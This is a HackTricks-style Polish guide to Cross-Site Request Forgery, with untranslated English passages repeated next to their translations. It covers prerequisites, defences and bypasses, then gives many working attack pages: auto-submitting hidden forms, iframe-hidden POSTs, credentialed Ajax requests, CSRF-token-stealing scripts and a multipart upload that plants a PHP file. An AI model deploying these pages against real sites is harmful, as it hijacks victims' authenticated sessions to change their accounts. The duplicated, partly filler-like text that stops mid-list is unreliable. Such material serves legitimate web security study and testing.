# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów GitHub.**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Dołącz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikować się z doświadczonymi hakerami i łowcami nagród za błędy!

**Wgląd w hakerstwo**\
Zajmuj się treściami, które zagłębiają się w emocje i wyzwania hakerstwa

**Aktualności na żywo z hakerstwa**\
Bądź na bieżąco z szybkim tempem świata hakerstwa dzięki aktualnym wiadomościom i wglądom

**Najnowsze ogłoszenia**\
Bądź na bieżąco z najnowszymi programami nagród za błędy i ważnymi aktualizacjami platformy

**Dołącz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) **i zacznij współpracować z najlepszymi hakerami już dziś!**


## Wyjaśnienie Cross-Site Request Forgery (CSRF)

**Cross-Site Request Forgery (CSRF)** to rodzaj podatności na zabezpieczenia znalezionej w aplikacjach internetowych. Umożliwia ona atakującym wykonanie działań w imieniu nieświadomych użytkowników, wykorzystując ich uwierzytelnione sesje. Atak jest wykonywany, gdy użytkownik, który jest zalogowany na platformie ofiary, odwiedza złośliwą witrynę. Ta witryna wywołuje następnie żądania do konta ofiary za pomocą metod takich jak wykonanie JavaScriptu, przesłanie formularzy lub pobranie obrazów.

### Wymagania wstępne dla ataku CSRF
Aby wykorzystać podatność CSRF, muszą zostać spełnione kilka warunków:

1. **Zidentyfikuj cenną akcję**: Atakujący musi znaleźć akcję, którą warto wykorzystać, taką jak zmiana hasła użytkownika, adresu e-mail lub podniesienie uprawnień.
2. **Zarządzanie sesją**: Sesja użytkownika powinna być zarządzana wyłącznie za pomocą plików cookie lub nagłówka autoryzacji podstawowej HTTP, ponieważ inne nagłówki nie mogą być manipulowane w tym celu.
3. **Brak nieprzewidywalnych parametrów**: Żądanie nie powinno zawierać nieprzewidywalnych parametrów, ponieważ mogą one uniemożliwić atak.

### Obrona przed CSRF
Można zastosować kilka środków zaradczych, aby chronić się przed atakami CSRF:

* [**SameSite cookies**](hacking-with-cookies/#samesite): Ta atrybut zapobiega przesyłaniu plików cookie przez przeglądarkę wraz z żądaniami między witrynami. [Więcej na temat plików cookie SameSite](hacking-with-cookies/#samesite).
* [**Cross-origin resource sharing**](cors-bypass.md): Polityka CORS witryny ofiary może wpływać na wykonalność ataku, zwłaszcza jeśli atak wymaga odczytu odpowiedzi z witryny ofiary. [Dowiedz się więcej o obejściu CORS](cors-bypass.md).
* **Weryfikacja użytkownika**: Wymaganie podania hasła użytkownika lub rozwiązanie captcha może potwierdzić intencję użytkownika.
* **Sprawdzanie nagłówków Referrer lub Origin**: Sprawdzanie tych nagłówków może pomóc upewnić się, że żądania pochodzą od zaufanych źródeł. Jednak staranne tworzenie adresów URL może obejść słabo zaimplementowane sprawdzanie, na przykład:
- Używanie `http://mal.net?orig=http://example.com` (adres URL kończy się zaufanym adresem URL)
- Używanie `http://example.com.mal.net` (adres URL zaczyna się od zaufanego adresu URL)
* **Modyfikowanie nazw parametrów**: Zmiana nazw parametrów w żądaniach POST lub GET może pomóc w zapobieganiu automatycznym atakom.
* **Tokeny CSRF**: Włączenie unikalnego tokenu CSRF w każdej sesji i wymaganie tego tokenu w kolejnych żądaniach może znacznie zmniejszyć ryzyko ataku CSRF. Skuteczność tokenu można zwiększyć poprzez wymuszenie CORS.

Zrozumienie i wdrożenie tych obronnych środków jest kluczowe dla utrzymania bezpieczeństwa i integralności aplikacji internetowych.

## Ominięcie obron

### Z POST na GET

Być może formularz, który chcesz wykorzystać, jest przygotowany do wysyłania **żądania POST z tokenem CSRF**, ale powinieneś **sprawdzić**, czy **żądanie GET** jest również **ważne** i czy podczas wysyłania żądania GET **token CSRF jest wciąż weryfikowany**.

### Brak tokenu

Aplikacje mogą implementować mechanizm **weryfikacji tokenów**, gdy są obecne. Jednak podatność pojawia się, jeśli weryfikacja jest całkowicie pomijana, gdy token jest nieobecny. Atakujący mogą wykorzystać to, **usuwając parametr**, który przenosi token, nie tylko jego wartość. Pozwala to ominąć proces weryfikacji i skutecznie przeprowadzić atak Cross-Site Request Forgery (CSRF).

### Token CSRF nie jest powiązany z sesją użytkownika

Aplikacje, które **nie wiążą tokenów CSRF z sesjami użytkowników**, stanowią znaczne **ryzyko dla bezpieczeństwa**. Te systemy weryfikują tokeny w oparciu o **globalny pul** zamiast zapewniać, że każdy token jest powiązany z sesją inicjującą.

Oto, jak atakujący wykorzystują to:

1. **Uwierzytelnij** się za pomocą własnego konta.
2. **Uzyskaj ważny token CSRF** z globalnego pulu.
3. **Użyj tego tokenu** w ataku CSRF przeciwko ofierze.

Ta podatność pozwala atakującym na dokonywanie nieautoryzowanych żądań w imieniu ofiary, wykorzystując **niewystarczający mechanizm weryfikacji tokenów** aplikacji.

### Ominięcie metody

Jeśli żądanie używa "**dziwnej**" **metody**, sprawdź, czy działa funkcjonalność **zastępowania metody**.
Na przykład, jeśli używa metody **PUT**, możesz spróbować użyć metody **POST** i **wysłać**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

To może również działać, wysyłając **parametr \_method wewnątrz żądania POST** lub używając **nagłówków**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Ominięcie niestandardowego tokenu nagłówka

Jeśli żądanie dodaje **niestandardowy nagłówek** z **tokenem** do żądania jako **metodę ochrony CSRF**, to:

*
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Zauważ, że jeśli **token csrf jest powiązany z ciasteczkiem sesji, ten atak nie zadziała**, ponieważ będziesz musiał ustawić ofiarze swoją sesję, a więc będziesz atakować siebie.
{% endhint %}

### Zmiana typu zawartości (Content-Type)

Zgodnie z [**tym**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), aby **uniknąć żądań wstępnych** przy użyciu metody **POST**, dozwolone są następujące wartości Content-Type:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Jednak zauważ, że **logika serwera może się różnić** w zależności od użytego Content-Type, dlatego powinieneś wypróbować wymienione wartości oraz inne, takie jak **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Przykład (z [tutaj](https://brycec.me/posts/corctf\_2021\_challenges)) wysyłania danych JSON jako text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Omijanie żądań Preflight dla danych JSON

Przy próbie wysłania danych JSON za pomocą żądania POST, bezpośrednie użycie `Content-Type: application/json` w formularzu HTML nie jest możliwe. Podobnie, korzystanie z `XMLHttpRequest` do wysyłania tego typu zawartości inicjuje żądanie Preflight. Niemniej jednak istnieją strategie, które potencjalnie umożliwiają obejście tego ograniczenia i sprawdzenie, czy serwer przetwarza dane JSON niezależnie od Content-Type:

1. **Użyj alternatywnych typów zawartości**: Wykorzystaj `Content-Type: text/plain` lub `Content-Type: application/x-www-form-urlencoded`, ustawiając `enctype="text/plain"` w formularzu. Ta metoda testuje, czy backend używa danych bez względu na Content-Type.

2. **Modyfikuj typ zawartości**: Aby uniknąć żądania Preflight, jednocześnie zapewniając, że serwer rozpoznaje zawartość jako JSON, możesz wysłać dane z `Content-Type: text/plain; application/json`. To nie wywołuje żądania Preflight, ale może być poprawnie przetwarzane przez serwer, jeśli jest skonfigurowany do akceptowania `application/json`.

3. **Wykorzystanie pliku SWF Flash**: Mniej popularna, ale możliwa metoda obejścia takich ograniczeń polega na użyciu pliku SWF Flash. Aby uzyskać bardziej szczegółowe informacje na temat tej techniki, zapoznaj się z [tym postem](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Ominięcie sprawdzania Referrer / Origin

**Unikaj nagłówka Referrer**

Aplikacje mogą sprawdzać nagłówek 'Referer' tylko wtedy, gdy jest obecny. Aby uniemożliwić przeglądarce wysłanie tego nagłówka, można użyć następującego znacznika meta w HTML:
```xml
<meta name="referrer" content="never">
```
To zapewnia, że nagłówek 'Referer' jest pomijany, co potencjalnie omija sprawdzanie poprawności w niektórych aplikacjach.

**Omijanie wyrażeń regularnych**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Aby ustawić nazwę domeny serwera w adresie URL, który Referrer ma wysłać wewnątrz parametrów, można to zrobić:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **Metoda obejścia HEAD**

Pierwsza część [**tego opisu CTF**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) wyjaśnia, że [kod źródłowy Oak](https://github.com/oakserver/oak/blob/main/router.ts#L281), routera jest ustawiony tak, aby **obsługiwać żądania HEAD jako żądania GET** bez ciała odpowiedzi - powszechne obejście, które nie jest unikalne dla Oak. Zamiast konkretnego obsługiwania żądań HEAD, są one po prostu **przekazywane do obsługi GET, ale aplikacja usuwa ciało odpowiedzi**.

Dlatego, jeśli żądanie GET jest ograniczone, można po prostu **wysłać żądanie HEAD, które zostanie przetworzone jako żądanie GET**.

## **Przykłady wykorzystania**

### **Wyciekanie tokenu CSRF**

Jeśli jako **obronę** używany jest **token CSRF**, można spróbować go **wyciec** wykorzystując podatność [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) lub podatność [**Dangling Markup**](dangling-markup-html-scriptless-injection/).

### **GET za pomocą znaczników HTML**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Inne znaczniki HTML5, które można użyć do automatycznego wysłania żądania GET, to:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Formularz żądania GET

A GET request is a type of HTTP request that is used to retrieve data from a server. In the context of web applications, a GET request is commonly used when submitting a form. When a user submits a form using the GET method, the form data is appended to the URL as query parameters.

For example, consider the following form:

```html
<form action="/search" method="GET">
  <input type="text" name="query" placeholder="Search...">
  <button type="submit">Search</button>
</form>
```

In this form, when the user enters a search query and clicks the "Search" button, a GET request will be sent to the server with the form data appended to the URL. The resulting URL might look like this:

```
/search?query=example
```

The server can then use the query parameter to process the search query and return the appropriate results.

It's important to note that GET requests should only be used for retrieving data and should not have any side effects on the server. This means that a GET request should not modify any data on the server or have any other unintended consequences.

### Żądanie GET formularza

Żądanie GET to rodzaj żądania HTTP, które służy do pobierania danych z serwera. W kontekście aplikacji internetowych żądanie GET jest często używane podczas przesyłania formularza. Gdy użytkownik przesyła formularz za pomocą metody GET, dane formularza są dołączane do adresu URL jako parametry zapytania.

Na przykład, rozważmy następujący formularz:

```html
<form action="/search" method="GET">
  <input type="text" name="query" placeholder="Szukaj...">
  <button type="submit">Szukaj</button>
</form>
```

W tym formularzu, gdy użytkownik wpisze zapytanie wyszukiwania i kliknie przycisk "Szukaj", zostanie wysłane żądanie GET do serwera z danymi formularza dołączonymi do adresu URL. Wynikowy adres URL może wyglądać tak:

```
/search?query=przykład
```

Serwer może następnie użyć parametru zapytania do przetworzenia zapytania wyszukiwania i zwrócenia odpowiednich wyników.

Warto zauważyć, że żądania GET powinny być używane tylko do pobierania danych i nie powinny mieć żadnych skutków ubocznych na serwerze. Oznacza to, że żądanie GET nie powinno modyfikować żadnych danych na serwerze ani mieć innych niezamierzonych konsekwencji.
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Formularz żądania POST

A form POST request is a type of HTTP request that is used to submit data to a server. It is commonly used in web applications to send data from a user's browser to the server for processing. The data is typically sent as key-value pairs, where the keys represent the names of the form fields and the values represent the user's input.

To make a form POST request, the user fills out a form on a web page and clicks a submit button. The browser then sends an HTTP POST request to the server, including the form data in the request body. The server processes the data and may perform actions based on the submitted values.

Form POST requests are vulnerable to Cross-Site Request Forgery (CSRF) attacks, where an attacker tricks a user into unknowingly submitting a malicious form on a trusted website. To protect against CSRF attacks, web applications can implement measures such as using CSRF tokens or checking the origin of the request.

### Żądanie POST formularza

Żądanie POST formularza to rodzaj żądania HTTP, które służy do przesyłania danych do serwera. Jest powszechnie stosowane w aplikacjach internetowych do przesyłania danych z przeglądarki użytkownika do serwera w celu ich przetworzenia. Dane są zwykle przesyłane jako pary klucz-wartość, gdzie klucze reprezentują nazwy pól formularza, a wartości reprezentują wprowadzone przez użytkownika dane.

Aby wysłać żądanie POST formularza, użytkownik wypełnia formularz na stronie internetowej i kliknie przycisk "Wyślij". Przeglądarka wysyła wtedy żądanie HTTP POST do serwera, włączając dane formularza w treść żądania. Serwer przetwarza dane i może wykonywać działania na podstawie przesłanych wartości.

Żądania POST formularza są podatne na ataki Cross-Site Request Forgery (CSRF), gdzie atakujący wprowadza użytkownika w błąd, aby nieświadomie wysłał złośliwy formularz na zaufanej stronie internetowej. Aby chronić się przed atakami CSRF, aplikacje internetowe mogą zastosować środki takie jak użycie tokenów CSRF lub sprawdzanie pochodzenia żądania.
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Formularz żądania POST za pomocą iframe

In some cases, attackers can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by using an iframe to submit a form POST request. This technique allows the attacker to trick the victim into unknowingly submitting a malicious request.

W niektórych przypadkach atakujący mogą wykorzystać podatności na Cross-Site Request Forgery (CSRF), używając iframe do wysłania żądania POST formularza. Ta technika pozwala atakującemu wprowadzić ofiarę w błąd, aby nieświadomie wysłała złośliwe żądanie.

To perform this attack, the attacker first creates a hidden iframe on a malicious website. The iframe is then loaded with the target website's form, which the attacker has tampered with. The form is pre-filled with the desired malicious values.

Aby przeprowadzić ten atak, atakujący najpierw tworzy ukryte iframe na złośliwej stronie internetowej. Następnie iframe jest ładowane formularzem docelowej witryny, który atakujący zmodyfikował. Formularz jest wstępnie wypełniony żądanymi złośliwymi wartościami.

When the victim visits the malicious website, the hidden iframe automatically submits the form, sending the malicious request to the target website. Since the request originates from the victim's browser, it appears legitimate to the target website.

Kiedy ofiara odwiedza złośliwą stronę internetową, ukryte iframe automatycznie wysyła formularz, przesyłając złośliwe żądanie do docelowej witryny. Ponieważ żądanie pochodzi z przeglądarki ofiary, wydaje się ono autentyczne dla docelowej witryny.

To protect against this type of attack, web developers should implement measures such as using anti-CSRF tokens, validating the origin of requests, and implementing strict SameSite cookie policies.

Aby chronić się przed tego rodzaju atakiem, programiści internetowi powinni zastosować środki takie jak używanie tokenów anti-CSRF, sprawdzanie pochodzenia żądań i wdrażanie restrykcyjnych polityk plików cookie SameSite.
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Zapytanie Ajax POST**

Ajax POST request is a type of HTTP request that is sent asynchronously to the server using the Ajax technology. It is commonly used to send data to the server without reloading the entire web page. This type of request is vulnerable to Cross-Site Request Forgery (CSRF) attacks.

Zapytanie Ajax POST to rodzaj żądania HTTP, które jest wysyłane asynchronicznie do serwera za pomocą technologii Ajax. Jest powszechnie stosowane do wysyłania danych do serwera bez konieczności ponownego ładowania całej strony internetowej. Ten rodzaj żądania jest podatny na ataki Cross-Site Request Forgery (CSRF).
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### żądanie POST z użyciem multipart/form-data

A `multipart/form-data` POST request is commonly used to submit data, especially files, through HTML forms. This type of request allows for the transmission of binary data, such as images or documents, along with other form fields.

To craft a `multipart/form-data` POST request, you need to include the following components:

1. Set the `Content-Type` header to `multipart/form-data`.
2. Use a boundary string to separate the different parts of the request.
3. Include each form field as a separate part, with a `Content-Disposition` header specifying the field name.
4. For file uploads, include the file as a separate part, with a `Content-Disposition` header specifying the field name and the file name.

Here's an example of a `multipart/form-data` POST request:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="username"

john.doe
-----------------------------1234567890
Content-Disposition: form-data; name="profile_picture"; filename="picture.jpg"
Content-Type: image/jpeg

...binary data of the image...
-----------------------------1234567890--
```

Remember to replace `example.com` with the actual target domain and adjust the field names, file names, and binary data accordingly.

By understanding how `multipart/form-data` POST requests work, you can effectively interact with web applications that utilize this form of data submission.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### żądanie POST multipart/form-data v2

In this technique, we will explore how to perform a Cross-Site Request Forgery (CSRF) attack using a multipart/form-data POST request. This type of request is commonly used for file uploads and form submissions that require binary data.

W tej technice będziemy badać, jak przeprowadzić atak Cross-Site Request Forgery (CSRF) za pomocą żądania POST multipart/form-data. Ten rodzaj żądania jest często używany do przesyłania plików i wysyłania formularzy, które wymagają danych binarnych.

To execute this attack, we need to create a malicious HTML page that will trick the victim into submitting the CSRF request. The page will contain a form with hidden fields that will automatically submit the request when loaded.

Aby przeprowadzić ten atak, musimy stworzyć złośliwą stronę HTML, która oszuka ofiarę i spowoduje wysłanie żądania CSRF. Strona będzie zawierać formularz z ukrytymi polami, które automatycznie wyślą żądanie po załadowaniu.

Here is an example of the HTML code for the malicious page:

Oto przykład kodu HTML dla złośliwej strony:

```html
<html>
<body>
  <h1>Click the button!</h1>
  <form action="https://example.com/upload" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="csrf_token" value="attacker_token">
    <input type="file" name="file">
    <input type="submit" value="Upload">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```

In this example, the form action points to the target website's upload endpoint. The hidden field "csrf_token" is set to the attacker's token, which will be used to bypass CSRF protection. The file input field allows the attacker to upload a file, and the submit button triggers the automatic submission of the form.

W tym przykładzie, atrybut "action" formularza wskazuje na punkt końcowy przesyłania na docelowej stronie internetowej. Ukryte pole "csrf_token" jest ustawione na token atakującego, który będzie używany do ominięcia ochrony CSRF. Pole "file" pozwala atakującemu przesłać plik, a przycisk "submit" wywołuje automatyczne wysłanie formularza.

When the victim visits the malicious page, the form will be automatically submitted, sending the CSRF request to the target website. If the victim is authenticated on the target website and has the necessary privileges, the request will be processed as if it came from the victim.

Kiedy ofiara odwiedza złośliwą stronę, formularz zostanie automatycznie wysłany, wysyłając żądanie CSRF na docelową stronę internetową. Jeśli ofiara jest uwierzytelniona na docelowej stronie i ma odpowiednie uprawnienia, żądanie zostanie przetworzone tak, jakby pochodziło od ofiary.

It is important to note that this technique may not work if the target website has implemented additional security measures, such as anti-CSRF tokens that are validated on the server-side.

Warto zauważyć, że ta technika może nie działać, jeśli docelowa strona internetowa zaimplementowała dodatkowe środki bezpieczeństwa, takie jak tokeny anti-CSRF, które są sprawdzane po stronie serwera.
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Formularz żądania POST z wnętrza iframe

When an HTML form is submitted, the browser sends a POST request to the specified URL. This behavior can be exploited in a Cross-Site Request Forgery (CSRF) attack by embedding the form within an iframe on a malicious website.

Kiedy formularz HTML zostaje wysłany, przeglądarka wysyła żądanie POST pod wskazany adres URL. To zachowanie może zostać wykorzystane w ataku Cross-Site Request Forgery (CSRF), poprzez osadzenie formularza wewnątrz iframe na złośliwej stronie internetowej.

To execute a CSRF attack using an iframe, the attacker needs to create a form with the desired parameters and target URL. This form is then embedded within an iframe on the attacker's website. When a user visits the attacker's website, the form is automatically submitted without their knowledge or consent.

Aby przeprowadzić atak CSRF za pomocą iframe, atakujący musi stworzyć formularz z żądanymi parametrami i docelowym adresem URL. Następnie formularz ten jest osadzany wewnątrz iframe na stronie internetowej atakującego. Kiedy użytkownik odwiedza stronę atakującego, formularz jest automatycznie wysyłany bez jego wiedzy i zgody.

This attack is successful if the user is authenticated on the target website and has an active session. The browser includes the user's session cookies in the POST request, making it appear as if the request originated from the user.

Atak ten jest udany, jeśli użytkownik jest uwierzytelniony na docelowej stronie internetowej i ma aktywną sesję. Przeglądarka dołącza pliki cookie sesji użytkownika do żądania POST, sprawiając, że żądanie wydaje się pochodzić od użytkownika.

To prevent CSRF attacks, web applications can implement measures such as using anti-CSRF tokens, checking the Referer header, or implementing SameSite cookies.

Aby zapobiec atakom CSRF, aplikacje internetowe mogą zastosować środki takie jak użycie tokenów anti-CSRF, sprawdzanie nagłówka Referer lub implementowanie plików cookie SameSite.
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Ukradnij token CSRF i wyślij żądanie POST**

Aby przeprowadzić atak CSRF, musisz najpierw ukraść token CSRF z witryny docelowej. Token ten jest zazwyczaj generowany przez serwer i dołączany do formularzy lub nagłówków żądań HTTP w celu weryfikacji tożsamości użytkownika.

#### **Metoda 1: Wykorzystanie podatności XSS**

Jeśli witryna docelowa jest podatna na ataki XSS (Cross-Site Scripting), możesz wykorzystać tę podatność do ukrycia skryptu na stronie, który będzie kradł token CSRF. Skrypt ten może następnie wysłać żądanie POST z ukradzionym tokenem do serwera atakującego.

#### **Metoda 2: Wykorzystanie podatności SSRF**

Jeśli witryna docelowa jest podatna na ataki SSRF (Server-Side Request Forgery), możesz wykorzystać tę podatność do wysłania żądania z serwera docelowego do serwera atakującego. W odpowiedzi na to żądanie, serwer atakujący może otrzymać token CSRF i użyć go do wysłania żądania POST.

#### **Metoda 3: Wykorzystanie podatności w aplikacji mobilnej**

Jeśli witryna docelowa ma powiązaną aplikację mobilną, możesz poszukać podatności w tej aplikacji, które umożliwią ci uzyskanie tokena CSRF. Możesz następnie użyć tego tokenu do wysłania żądania POST z serwera atakującego.

Po uzyskaniu tokena CSRF, możesz wysłać żądanie POST z ukradzionym tokenem do serwera docelowego. Ten żądanie zostanie uznane za prawidłowe, ponieważ zawiera poprawny token CSRF, co pozwoli ci na wykonanie nieautoryzowanych działań w imieniu użytkownika.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Kradzież tokena CSRF i wysłanie żądania POST za pomocą iframe, formularza i Ajax**

W tej technice atakujący kradnie token CSRF z witryny docelowej i następnie wysyła żądanie POST, wykorzystując iframe, formularz i Ajax. Poniżej przedstawiono kroki do wykonania tego ataku:

1. Atakujący tworzy stronę internetową, która zawiera ukryte iframe, formularz i kod Ajax.
2. W ukrytym iframe atakujący umieszcza adres URL witryny docelowej, na której znajduje się formularz, który ma zostać sfałszowany.
3. W formularzu atakujący umieszcza pola, które są wymagane przez formularz na witrynie docelowej, w tym pole dla tokena CSRF.
4. Za pomocą kodu Ajax atakujący wysyła żądanie POST na witrynę docelową, wykorzystując dane z formularza.
5. Ponieważ żądanie jest wysyłane z tej samej domeny, co witryna docelowa, token CSRF jest automatycznie dołączany do żądania.
6. Witryna docelowa, nieświadoma ataku, przetwarza żądanie i wykonuje odpowiednie akcje.

Ten atak jest skuteczny, ponieważ atakujący może wykorzystać zaufanie witryny docelowej do wysłania sfałszowanego żądania. Aby się przed nim chronić, witryny powinny weryfikować źródło żądania i sprawdzać, czy token CSRF jest prawidłowy.
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Ukradnij token CSRF i wyślij żądanie POST za pomocą iframe i formularza**

Aby ukraść token CSRF i wysłać żądanie POST za pomocą iframe i formularza, wykonaj następujące kroki:

1. Utwórz stronę internetową, na której znajduje się złośliwy kod.
2. Na tej stronie umieść iframe, który będzie wczytywał docelową stronę, na której znajduje się formularz.
3. Wewnątrz iframe dodaj skrypt JavaScript, który będzie wykonywał następujące czynności:
   - Pobierz token CSRF z formularza na docelowej stronie.
